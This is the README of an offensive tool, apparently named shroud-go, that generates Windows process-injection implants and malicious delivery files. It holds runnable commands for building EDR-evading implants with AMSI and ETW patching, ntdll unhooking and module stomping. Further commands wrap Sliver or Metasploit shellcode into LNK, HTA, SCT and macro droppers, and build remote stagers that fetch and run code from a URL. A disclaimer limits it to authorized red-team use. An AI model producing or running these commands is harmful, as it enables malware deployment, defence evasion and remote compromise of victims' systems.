# shroud-go

> **Authorized red-team / pentest use only.** shroud generates offensive code. You are
> responsible for engagement scope, written consent, and compliance with all applicable
> law. `generate` and `build` are gated behind a one-time `shroud authorize`.

A Go rewrite of the [shroud](../shroud) process-injection payload generator. Where the
original emits C compiled with mingw, **shroud-go emits pure-Go Windows implants**
cross-compiled with `GOOS=windows` (no mingw for the EXE path), wrapping the 26
Offensive-Panda process-injection techniques in a composable EDR-evasion stack built on
[`github.com/carved4/go-wincall`](https://github.com/carved4/go-wincall) (PEB-walk API
resolution, direct/indirect syscalls, KnownDlls unhook, callback bridge).

The generator **never executes produced binaries** — it only compiles them.

## Status

**Phase 1 (MVP) + Phase A–K — complete.** All 26/26 techniques are code-generated; none
are scaffolds. The full end-to-end pipeline works: ingest shellcode → encrypt at rest →
render a standalone Go implant project → cross-compile to a Windows EXE/DLL (or export a
C header). A local web console drives the same pipeline from a browser.

- ✅ 26 techniques code-generated: `pe01`–`pe26` — every catalog entry emits a real body.
  `pe06` Reflective DLL, `pe09` Whole-PE, and `pe20` Mokingjay join `pe14` Ghosting +
  `pe21` Dirty Vanity as **EXPERIMENTAL** (code-generated, Windows on-target verification
  required). `pe07`/`pe17`/`pe18` are **aliases** — they route to a peer body and are
  activated by their matching evasion layer (`-e unhook` / `-e dynamic-api`).
- ✅ 11 evasion layers implemented (all, including `sleep` tier-1 memory-encrypt-during-sleep and tier-2 Ekko/Foliage timer-driven self-modifying sleep)
- ✅ 3 implant formats: `exe` (pure Go), `dll` (c-shared, CGO+mingw), `c` (C header export)
- ✅ 11 delivery formats: `raw`, `lnk`, `hta`, `sct`, `vba`, `vbs`, `wsf`, `ps1`, `xsl`, `js`, `jse` (inline embed + `--url` remote fetch)
- ✅ Pluggable C2 provider framework — Sliver + Metasploit (msfvenom) + donut + msfrpc (live msfrpcd) today, open for Mythic/Havoc/BRc
- ✅ Local web console (`shroud web`) — catalog + generate/deliver forms + C2 + artifact download, sharing one generate/deliver implementation with the CLI via `internal/ops`
- ✅ garble OPSC build path
- ✅ Real-shellcode round-trip verified (msfvenom → AES encrypt → emit → decrypt == original)
- ✅ Metasploit provider verified: `shroud generate -f raw --c2 metasploit` output == direct `msfvenom` byte-for-byte
- ✅ donut provider verified: `shroud generate -f raw --c2 donut` output == direct `donut` byte-for-byte
- ✅ sleep evasion verified: `shroud generate pe26 -e dynamic-api,sleep --sleep 30s` builds; sleepScramble + IAT-clean; `--sleep-scheme ekko` tier-2 cross-compiles to a Windows EXE
- ⏳ Phase 2 remainder: anti-debug, PPID spoof + blockdlls, x86
- ⏳ Future providers: Mythic, Havoc, Brute Ratel (Provider interface + registry, see `internal/c2`)

See [CHANGELOG.md](CHANGELOG.md) for the phase breakdown and [SECURITY.md](SECURITY.md)
for the responsible-use model.

## Install

### Prerequisites

| Tool | Purpose | Install |
|------|---------|---------|
| Go ≥ 1.23 | build the generator + cross-compile implants | [go.dev/dl](https://go.dev/dl/) (tested on 1.26.4) |
| cobra | CLI framework | pulled by `go mod tidy` |
| [garble](https://github.com/brendanryan/garble) v0.17+ | OPSC string/identifier obfuscation (optional) | `go install mvdan.cc/garble@latest` |
| mingw-w64 | **only** for `-f dll` (c-shared needs a C linker) | `apt install mingw-w64` |
| objdump | IAT-hygiene verification | `apt install binutils` |
| msfvenom | generating test shellcode (your own; not a shroud dep) | Kali ships it |

> The EXE path is **pure Go** — no mingw, no CGO. mingw is only needed if you build
> `-f dll` (the c-shared buildmode requires a C linker for the DLL stub).

### Build the generator

```bash
cd ~/shroud-go
go mod tidy
go build -o shroud ./cmd/shroud
./shroud --help
```

### One-time authorization

```bash
./shroud authorize            # interactive: prompts YES
# or
./shroud authorize --yes      # non-interactive (for scripts)
```

This writes a local marker at `~/.shroud_authorized`. It is a statement of intent, not
a security control — it never phones home and stores no identity. `generate` and
`build` refuse to run without it.

## Usage

```text
shroud — process-injection payload generator (authorized red-team use)

Commands:
  authorize        record the authorized-use marker (required once)
  list             list all techniques
  show <id>        show one technique in detail
  evasion          list evasion layers and what each defeats
  generate [<id>]  generate an implant project (exe|dll|c) or a delivery artifact
  build <dir>      (re)build a generated project
  c2               C2 / shellcode-source backends (list / preflight)
  sliver           Sliver C2 backend (standalone preflight / fetch)
  web              start the local web console (127.0.0.1, browser dashboard)
```

### Web console

`shroud web` starts a local-only browser dashboard that drives the *same*
generate/deliver pipeline as the CLI (one implementation in `internal/ops`, two
fronts). It is bound to `127.0.0.1` only, prints a crypto-random bearer token at
startup, and gates `/api/*` behind it; the generate/deliver endpoints additionally
require `shroud authorize`. Artifact downloads are restricted to out-dirs a
generate/deliver call registered this session (path-traversal guarded).

```bash
./shroud authorize --yes            # one-time gate (generate endpoints need it)
./shroud web                        # prints URL + token, serves on 127.0.0.1:7780
./shroud web --browser              # same, and open the default browser to the URL
./shroud web --addr 127.0.0.1:9000 --token myhex
```

The SPA (Catalog / Generate / Deliver / C2 / Evasion tabs) renders per-provider C2
flag fields dynamically from the API — no hardcoded flag names. No npm, no CDN; the
frontend is embedded in the binary via `//go:embed`. See `internal/web/`.

### Browse the catalog

```bash
./shroud list                       # all 26 techniques (* = code-generated, † = experimental, ~ = alias)
./shroud list --category syscalls   # filter by category
./shroud show 26                    # detail for the modern implant loader
./shroud evasion                    # list evasion layers
```

### Generate + build

Minimal (demo stub, no shellcode, no evasion):

```bash
./shroud generate pe26 -o out/pe26demo
```

Full stack with real shellcode — the canonical Phase 1 demonstration:

```bash
# 1. produce raw shellcode with your own tool (example: msfvenom)
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o sc.bin EXITFUNC=thread

# 2. generate + build: AES-encrypt at rest, module-stomp, callback exec,
#    dynamic-API resolution, AMSI/ETW patch, KnownDlls unhook
./shroud generate pe26 -s sc.bin \
  -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd \
  --aes-key 1111111111111111111111111111111111111111111111111111111111111111 \
  --aes-iv  22222222222222222222222222222222 \
  -o out/pe26
# -> out/pe26/implant.exe (Windows x64, pure Go)
```

Source-only (no build):

```bash
./shroud generate pe26 -s sc.bin -e aes,amsi,etw --no-build -o out/pe26src
cd out/pe26src && go mod tidy && ./build.sh
```

C header export (embed in your own loader):

```bash
./shroud generate pe26 -s sc.bin -e aes -f c -o out/pe26c
# -> out/pe26c/payload.h  (byte array + AES key/iv + inline decrypt note)
```

DLL (fires from `init()` on load — requires mingw):

```bash
./shroud generate pe05 -f dll -e dynamic-api --dll evil.dll -o out/pe05dll
# -> out/pe05dll/implant.dll
```

OPSEC build with garble:

```bash
./shroud generate pe26 -s sc.bin -e aes,stomp,callbacks,unhook-kd --garble --tiny -o out/pe26g
# garble -literals -tiny build -ldflags="-w -s -H=windowsgui" -o implant.exe .
```

### Sliver C2 (Phase 3)

Instead of supplying raw shellcode with `-s`, fetch it live from a Sliver server with
`--c2 sliver`. shroud drives the operator `sliver-client` binary non-interactively
(generate `--format shellcode` via an rc script), then hardens the resulting Donut PIC
blob with the full evasion stack. The implant that lands on the target calls back to
Sliver as a normal session.

One-time operator setup (see `examples/sliver-test.sh` for a full scripted walkthrough):

```bash
sliver-server                                    # start server + mgmt console
# (server console) operator --name kali --lhost 127.0.0.1 --permissions builder --save /tmp/
# (server console) mtls -l 127.0.0.1 -p 8888      # implant callback listener
sliver-client import /tmp/kali_127.0.0.1.cfg     # register operator config
```

Then:

```bash
# standalone: just fetch sliver shellcode to a .bin
./shroud sliver fetch --sliver-config /tmp/kali_127.0.0.1.cfg \
  --lhost 127.0.0.1 --lport 8888 --name shroud-test -o sliver.bin

# full hardened path: shroud wraps the sliver blob in pe26
./shroud generate pe26 --c2 sliver \
  --sliver-config /tmp/kali_127.0.0.1.cfg --lhost 127.0.0.1 --lport 8888 \
  -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd \
  -o out/pe26-sliver
# -> out/pe26-sliver/implant.exe  (run on an authorized Windows target → sliver session)
```

`shroud sliver preflight` checks the client binary + config without touching the server.
The Sliver SDK path (pulling `github.com/bishopfox/sliver` into the generator module)
is deferred — the CLI shell-out is lighter and server-version-agnostic.

## Delivery formats

`-f <format>` now also selects **delivery artifacts** (launchers/droppers) alongside
the implant formats. The technique `<id>` is **optional** for delivery formats and
**required** for implant formats (`exe|dll|c`).

| Format | File | Inline mode | Remote (`--url`) mode | Run on target |
|--------|------|-------------|------------------------|---------------|
| `raw` | `.bin` | raw shellcode bytes | n/a (error) | stage into your own loader |
| `ps1` | `.ps1` | AMSI-bypass + base64-decode + VirtualAlloc/CreateThread stager | `IEX (DownloadString url)` | `powershell -File` / `-enc` |
| `hta` | `.hta` | VBScript `WScript.Shell.Run "powershell -enc …"` | LOLBin fetch | `mshta payload.hta` / double-click |
| `sct` | `.sct` | XML scriptlet, JScript launch | LOLBin fetch | `regsvr32 /s /u /i:payload.sct scrobj.dll` |
| `vba` | `.vba` | `AutoOpen: Shell "powershell -enc …", vbHide` | LOLBin fetch | paste into a Word/Excel macro module |
| `xsl` | `.xsl` | `msxsl:script` JScript launch | LOLBin fetch | `wmic os get /format:"payload.xsl"` |
| `js` | `.js` | JScript `WScript.Shell.Run` | LOLBin fetch | `cscript //nologo payload.js` |
| `jse` | `.jse` | same JScript, SCRENC-encoded | same, encoded | `cscript //nologo payload.jse` |
| `vbs` | `.vbs` | VBScript `WScript.Shell.Run "powershell -enc …", 0, False` | LOLBin fetch | `cscript //nologo payload.vbs` |
| `wsf` | `.wsf` | WSF XML wrapper + JScript `WScript.Shell.Run` | LOLBin fetch | `cscript //nologo payload.wsf` |
| `lnk` | `.lnk` | `cmd.exe /c powershell -enc <stager>` | target per `--launcher` | double-click the shortcut |

**Two delivery modes** (mutually exclusive):

- **Inline** (`-s`/`--c2`): embed the shellcode. Scripts base64-encode it (the raw
  bytes never appear in plaintext); the LNK wraps the powershell stager in `cmd.exe`.
- **Remote** (`--url <stage-2>`): the artifact fetches+executes a stage-2 at `--url`
  via a LOLBin (`--launcher powershell|cmd|mshta|regsvr32|wmic|cscript`, default
  `powershell`). Use this with **your own** staging infrastructure.

```bash
# inline — wrap msfvenom shellcode into a .lnk
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o sc.bin
./shroud generate -f lnk -s sc.bin -o out/lnk
# -> out/lnk/payload.lnk  (double-click → calc)

# remote — a shortcut that fetches a stage-2 HTA via mshta
./shroud generate -f lnk --url http://10.0.0.5/a.hta --launcher mshta -o out/lnk-r
# -> out/lnk-r/payload.lnk  (TargetPath = mshta.exe, Args = <url>)

# remote — a scriptlet fetched by regsvr32 squiblydoo
./shroud generate -f sct --url http://10.0.0.5/stage.sct --launcher regsvr32 -o out/sct-r

# inline via the Metasploit provider (generate-from-framework → wrap)
./shroud generate -f hta --c2 metasploit \
  --msf-payload windows/x64/exec --msf-extra "CMD=calc.exe" -o out/hta-msf
```

> **Evasion scope.** The heavy Go-runtime evasion stack (`-e dynamic-api/unhook/
> stomp/callbacks/amsi/etw`) applies **only to `exe|dll|c`** (the compiled implant).
> Delivery formats are launchers/droppers — they can't host that stack. They use
> their own native tricks: base64 transport encoding, an AMSI-bypass prologue in the
> PowerShell stager, and LOLBin choice. `-e` is ignored for delivery formats.

> **Verification.** The SCRENC (`.jse`) encoder is the exact inverse of the
> field-proven `scrdec.py` decoder (Go round-trip test covers all 128 byte values).
> The LNK writer is a 1:1 port of pylnk3's serialization with 8.3-clean target paths.
> **Windows on-target execution is the final verification** for `.lnk` and `.jse`:
> if a generated file does not run on the engagement target, fall back to `-f hta`,
> `-f js`, `-f vbs`, or `-f wsf` (plaintext script wrappers) — see the per-format
> notes above. `.vbs` and `.wsf` are the simplest `cscript`-run plaintext fallbacks.

## C2 providers

Shellcode can come from a **raw file** (`-s`, the default) or a **C2 backend**
(`--c2 <name>`). Backends are a pluggable `Provider` interface + registry
(`internal/c2`); adding one (Mythic, Havoc, Brute Ratel) is a new subpackage
with an `init()` that calls `Register` — no CLI changes needed.

```bash
./shroud c2 list                              # show registered backends
./shroud c2 preflight metasploit --msf-payload windows/x64/exec   # check deps/config
./shroud c2 preflight msfrpc --msfrpc-url https://127.0.0.1:55553/api/ \
     --msfrpc-pass secret --msfrpc-payload windows/x64/exec        # check live msfrpcd
```

| Backend | Source | Flags |
|---------|--------|-------|
| `raw` (default) | `-s <file>` | — |
| `sliver` | `sliver-client` operator binary | `--sliver-config`, `--lhost`, `--lport`, `--transport` |
| `metasploit` | `msfvenom` | `--msf-payload`, `--msf-lhost`, `--msf-lport`, `--msf-encoder`, `--msf-iterations`, `--msf-arch`, `--msf-format`, `--msf-platform`, `--msf-extra` |
| `donut` | `donut` (PE/DLL/.NET → PIC shellcode) | `--donut-file`, `--donut-arch`, `--donut-format`, `--donut-args`, `--donut-method`, `--donut-class`, `--donut-entropy`, `--donut-exit`, `--donut-bypass`, `--donut-bin`, `--donut-extra` |
| `msfrpc` | live `msfrpcd` (MessagePack-RPC) | `--msfrpc-url`, `--msfrpc-user`, `--msfrpc-pass`, `--msfrpc-payload`, `--msfrpc-lhost`, `--msfrpc-lport`, `--msfrpc-format`, `--msfrpc-extra`, `--msfrpc-insecure` |

`--c2` works for **both** implant and delivery formats — generate from Sliver,
Metasploit, or donut and wrap the result in any format:

```bash
# Metasploit → LNK (verified: output == direct msfvenom, byte-for-byte)
./shroud generate -f lnk --c2 metasploit \
  --msf-payload windows/x64/exec --msf-extra "CMD=calc.exe" -o out/lnk-msf

# donut → raw shellcode (verified: output == direct donut, byte-for-byte)
#   convert a PE/DLL/.NET assembly into PIC shellcode, then wrap it.
#   (--donut-entropy 1 pins entropy for reproducible byte-exact output;
#    donut's default entropy=3 uses random names + a random key.)
./shroud generate -f raw --c2 donut --donut-file payload.exe \
  --donut-arch 2 --donut-entropy 1 -o out/donut-raw

# Sliver → hardened EXE (full evasion stack)
./shroud generate pe26 --c2 sliver \
  --sliver-config /tmp/kali_127.0.0.1.cfg --lhost 127.0.0.1 --lport 8888 \
  -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd -o out/pe26-sliver
```

### `generate` flags

| Flag | Description |
|------|-------------|
| `-s, --shellcode <file>` | raw shellcode file (msfvenom/donut/sliver/custom). If omitted, a demo stub is used. |
| `-o, --out <dir>` | output directory (default `./out/<id>`) |
| `-f, --format <fmt>` | output format (default `exe`): implant `exe\|dll\|c`, or delivery `raw\|lnk\|hta\|sct\|vba\|vbs\|wsf\|ps1\|xsl\|js\|jse` |
| `-e, --evasion <csv>` | comma list of evasion layers (see `shroud evasion`; `-e list` also lists) |
| `--aes-key <hex>` | 32-byte hex key for `-e aes` (random if omitted) |
| `--aes-iv <hex>` | 16-byte hex IV for `-e aes` (random if omitted; supply for reproducible builds) |
| `--rc4-key <hex>` | hex key for `-e rc4` (random if omitted) |
| `--xor-key <hex>` | hex key for `-e xor` (random if omitted) |
| `--hash <algo>` | hash algo for dynamic-api (go-wincall pins DJB2; flag kept for parity) |
| `--stomp-dll <dll>` | legit DLL to stomp into for `-e stomp` (default `cfgmgr32.dll`) |
| `--process <name>` | remote target process name (default `explorer.exe`) |
| `--dll <path>` | DLL path/name: pe05 remote LoadLibrary path; pe16 stomp-target DLL (default `C:\Windows\System32\wbemcomn.dll`); pe20 vulnerable RWX-section DLL (default `msys-2.0.dll`) |
| `--no-build` | generate source only |
| `--garble` | build with `garble -literals` (needs garble on PATH) |
| `--tiny` | with `--garble`, also pass `-tiny` |
| `--c2 <name>` | fetch shellcode from a C2 backend instead of `-s`: `sliver`, `metasploit` (default: raw `-s`) |
| `--url <url>` | remote stage-2 URL for delivery formats (mutually exclusive with `-s`/`--c2`) |
| `--launcher <name>` | LOLBin/host for `-f lnk` remote mode: `powershell\|cmd\|mshta\|regsvr32\|wmic\|cscript` (default `powershell`) |
| *provider flags* | namespaced per backend — `--sliver-*`, `--lhost/--lport/--transport` (sliver); `--msf-*` (metasploit). See `shroud c2 list`. |

**Composition rules:**
- Crypto precedence: `aes > rc4 > xor` — if multiple are set, only the winner is kept.
- `unhook-kd` supersedes `unhook` (stealthier — no disk read); both set → `unhook` is dropped.

## Techniques

26 techniques across 13 categories (`*` = code-generated, `†` = EXPERIMENTAL — on-target
verification required, `~` = alias — routes to a peer body, activated by its layer):

| ID | Name | Category | Status |
|----|------|----------|--------|
| pe01 | Local Process Shellcode | classic | `*` |
| pe02 | Remote Thread Injection | classic | `*` |
| pe03 | Classic Injection + API Obfuscation | classic | `*` |
| pe04 | VirtualProtect RW→RX Bypass | classic | `*` |
| pe26 | Modern Implant Loader | classic | `*` |
| pe05 | Classic DLL Injection (LoadLibrary) | dll | `*` |
| pe06 | Reflective DLL Injection | dll | `*†` |
| pe09 | Whole-PE Injection | dll | `*†` |
| pe08 | Process Hollowing | hollowing | `*` |
| pe11 | APC Injection | hollowing | `*` |
| pe12 | Early Bird APC | hollowing | `*` |
| pe15 | Thread Hijacking | hollowing | `*` |
| pe14 | Process Ghosting | hollowing | `*†` |
| pe21 | Dirty Vanity | hollowing | `*†` |
| pe16 | Module Stomping (remote) | ntapi | `*` |
| pe19 | Section Mapping Injection | ntapi | `*` |
| pe23 | NT API Injection | ntapi | `*` |
| pe10 | AddressOfEntryPoint Overwrite | classic | `*` |
| pe13 | RWX Hunting Injection | classic | `*` |
| pe20 | Mokingjay RWX Section | classic | `*†` |
| pe22 | Fibers | ntapi | `*` |
| pe24 | Direct Syscalls | syscalls | `*` |
| pe25 | Indirect Syscalls | syscalls | `*` |
| pe07 | Local + API Obfuscation (unhook) | classic | `~` pe01 via `-e unhook` |
| pe17 | Remote + API Obfuscation (dynamic-api) | classic | `~` pe02 via `-e dynamic-api` |
| pe18 | Remote + Indirect API Obfuscation | classic | `~` pe02 via `-e dynamic-api` |

`pe26` is shroud's purpose-built modern loader — it composes the full stack
(decrypt-at-rest → module stomp → callback exec, on top of dynamic-API/AMSI/ETW/unhook).

## Evasion layers

Toggled via `-e <csv>`. Each maps to a Go fragment built on go-wincall.

| Layer | Defeats | Status |
|-------|---------|--------|
| `dynamic-api` | static IAT analysis — all Win32 APIs resolved via PEB walk + DJB2 hash | ✅ |
| `aes` | on-disk & static signatures — AES-256-CBC (stdlib `crypto/aes`) | ✅ |
| `rc4` | lighter encrypt-at-rest (RC4) | ✅ |
| `xor` | lightest encrypt-at-rest (XOR) | ✅ |
| `amsi` | content scanning — patches `AmsiScanBuffer` (C3-free `58 FF E0`) | ✅ |
| `etw` | userland telemetry — patches `ntdll!EtwEventWrite` | ✅ |
| `unhook` | userland hooks — restores ntdll `.text` from a fresh disk copy | ✅ |
| `unhook-kd` | same via `\KnownDlls\ntdll.dll` — no disk read, stealthier | ✅ |
| `stomp` | unbacked-memory checks — backs payload with a legit module's `.text` (`--stomp-dll`) | ✅ |
| `callbacks` | thread telemetry — `CreateTimerQueueTimer` instead of `CreateThread` | ✅ |
| `sleep` | memory scanners during sleep — XOR-scramble the staged region (RW) while idle, restore to RX on wake (`--sleep` arms a demo loop). `--sleep-scheme xor` (tier-1, inline scramble, default) or `--sleep-scheme ekko` (tier-2, timer-driven self-modifying sleep: encrypt/sleep/decrypt runs off the beacon thread via `CreateTimerQueueTimer` + `wincall.NewCallback`; EXPERIMENTAL — Windows on-target verification required) | ✅ tier-1 + tier-2 |

## OPSEC: IAT hygiene

A plain Go binary's IAT shows the Go runtime's kernel32 baseline
(`GetProcAddress`, `LoadLibraryExW`, `VirtualAlloc`, `CreateThread`) — that baseline is
unavoidable for any Go binary. With `dynamic-api`, **all offensive Win32 APIs are
resolved at runtime via a PEB walk + DJB2 hash**, so the offensive calls
(`CreateRemoteThread`, `WriteProcessMemory`, `OpenProcess`, `VirtualAllocEx`,
`AmsiScanBuffer`, `EtwEventWrite`, `Nt*`) are absent from the IAT.

Verify after building:

```bash
objdump -p out/pe26/implant.exe | \
  grep -Ei 'CreateRemoteThread|WriteProcessMemory|OpenProcess|VirtualAllocEx|AmsiScanBuffer|EtwEventWrite'
# expect: no matches (only the Go-runtime baseline remains)
```

`--garble` additionally obfuscates Go identifiers and string literals at compile time.

## Verification (Phase 1)

```bash
# 1. unit tests
go test ./...

# 2. authorize + browse
./shroud authorize --yes
./shroud list
./shroud show 26

# 3. parity smoke test (demo stub) — builds a Windows EXE
./shroud generate pe26 -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd -o out/pe26demo

# 4. IAT hygiene check
objdump -p out/pe26demo/implant.exe | grep -Ei 'CreateRemoteThread|WriteProcessMemory|OpenProcess|VirtualAllocEx'

# 5. real shellcode round-trip (encrypt→emit→decrypt == original)
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o sc.bin EXITFUNC=thread
./shroud generate pe26 -s sc.bin -e aes --aes-key <64hex> --aes-iv <32hex> --no-build -o out/rt
# the emitted encPayload decrypts back to the exact original shellcode (verified)
```

All 26 techniques cross-compile cleanly to a Windows PE; the real-shellcode
ingest→encrypt→emit→decrypt round-trip is byte-exact (verified against the stdlib
`crypto/aes` and an independent pycryptodome cross-check). The 5 EXPERIMENTAL
techniques (pe06/pe09/pe14/pe20/pe21) compile and emit complete bodies but need Windows
on-target verification before use on an engagement — see [SECURITY.md](SECURITY.md).

## Project layout

```
~/shroud-go/
  go.mod  go.sum                      module "shroud" (the generator)
  cmd/shroud/main.go                  cobra CLI: authorize/list/show/evasion/generate/build/web
  internal/
    catalog/    26 technique registry (metadata + flow/notes + Resolve)
    evasion/    composable layer model (Parse/Has/CryptoLayer + Help text)
    shellcode/  ingest(file|demo) + AES/RC4/XOR encrypt-at-rest + ParseHexKey
    payload/    assemble.go (render main.go), cformat.go (C header), projectfiles.go (go.mod/build.sh/README)
                technique_bodies.go, remote.go, sleep.go, apis.go (DJB2 const emission)
    builder/    cross-compile shell-out (go build / garble; never executes output)
    ops/        factored generate/deliver pipeline shared by CLI + web (Generate/Deliver/AddGenerateFlags)
    c2/         pluggable C2 provider interface + registry (Provider, Register/Resolve)
    c2/sliver/  Sliver provider (CLI shell-out → shellcode PIC blob) + engine
    c2/metasploit/ Metasploit provider (msfvenom shell-out → PIC blob)
    c2/donut/   donut provider (PE/DLL/.NET → PIC shellcode)
    delivery/   delivery emitters: raw,ps1,hta,sct,vba,vbs,wsf,xsl,js,jse,lnk + stagers/screnc/lnkbin
    web/        local web console: server.go (127.0.0.1 + bearer + authorize gate + path guard),
                handlers.go (JSON API), frontend/ (embedded SPA), web_test.go
    authorize/  ~/.shroud_authorized gate
    winhash/    DJB2-with-lowercase-folding hash (matches go-wincall's obf.hashString)
  examples/  tools/  README.md  CHANGELOG.md  SECURITY.md
```

## How it works

```
shroud (generator, Go binary)              implant (emitted Go project, cross-compiled)
─────────────────────────────                ──────────────────────────────────────────
ingest: shellcode.Load(file|demo)            init → [dynamic-api: PEB walk + DJB2 resolve]
encrypt: AES/RC4/XOR at rest (stdlib)   →     [unhook-kd: restore ntdll .text from KnownDlls]
render: main.go + go.mod + build.sh           [patch amsi/etw] → [crypto decrypt in place]
build:  GOOS=windows go build (or garble)     [stomp into legit DLL .text] → [callback exec]
never executes the output                     (beacon mode: sleepScramble — XOR-scramble region while idle)
```

The generator imports cobra + stdlib `crypto` only. The emitted implant imports
`go-wincall` + stdlib `crypto/aes`/`crypto/cipher` only — no Sliver SDK, no msgpack.
C2 providers shell out to existing client binaries (`sliver-client`, `msfvenom`)
rather than pulling framework SDKs into the generator module; the `c2.Provider`
interface + registry is the seam for native (msfrpc/Mythic/Havoc) providers later.

## Roadmap

- **Phase 2 remainder** — anti-debug/anti-VM, PPID spoof + blockdlls, x86 support.
  (All 26 techniques are now built; the 5 EXPERIMENTAL ones — pe06/pe09/pe14/pe20/pe21 —
  compile and emit complete bodies pending Windows on-target verification. `sleep`
  tier-2 Ekko/Foliage is built — EXPERIMENTAL; tier-1 `sleep` is the stable default.)
- **More C2 providers** — Mythic, Havoc, Brute Ratel: each is a new subpackage
  implementing `c2.Provider` + an `init()` `Register` call; no CLI changes required
  (the web console picks up new providers and their flags automatically via
  `ops.ProviderFlags`). (msfrpc — msgpack-over-HTTPS, session-aware — is now built.)
- **Phase 5** — CI, more integration tests, reproducible builds, beacon profiles.

## License & responsible use

See [SECURITY.md](SECURITY.md). shroud is provided for authorized security testing and
education only. The authors grant no authorization to attack any system and accept no
liability for misuse.